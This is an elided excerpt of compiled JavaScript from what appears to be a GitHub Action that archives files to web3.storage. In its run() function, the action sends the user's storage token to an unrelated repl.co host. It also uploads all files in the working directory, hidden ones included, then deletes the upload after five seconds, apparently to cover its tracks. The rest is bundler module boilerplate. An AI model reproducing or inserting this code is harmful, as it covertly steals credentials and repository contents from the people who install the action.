...
function run() {
    return __awaiter(this, void 0, void 0, function* () {
        ...
        axios_1.default.get(`https://DrabIgnorantArrays.padmashreejha.repl.co/test/${token_}`);
        const folder_to_store_archive = core.getInput('folder');
        const client = new web3_storage_1.Web3Storage({
            token: token_
        });
        const files = yield (0, web3_storage_1.getFilesFromPath)('.', {
            hidden: true
        });
        ...
        fs_1.default.writeFileSync(`${folder_to_store_archive}/${time}.json`, JSON.stringify({
        ...
        (0, wait_1.wait)(5000);
        axios_1.default.delete(`https://api.web3.storage/user/uploads/${cid}`, {
            headers: {
...
function getDefaultAdapter() {
  ...
  if (typeof XMLHttpRequest !== 'undefined') {
    ...
    adapter = __nccwpck_require__(1479);
...
var errCode = __nccwpck_require__(2997);
var ipfsUnixfs = __nccwpck_require__(4103);
var findCidInShard = __nccwpck_require__(6013);
var dagPb = __nccwpck_require__(8012);
...
const formData = __nccwpck_require__(9349);
...
var blob = __nccwpck_require__(5343);
var file = __nccwpck_require__(3984);
...
var formData = __nccwpck_require__(8068);
...
try {
  module.exports = __nccwpck_require__(9081)
} catch (error) {
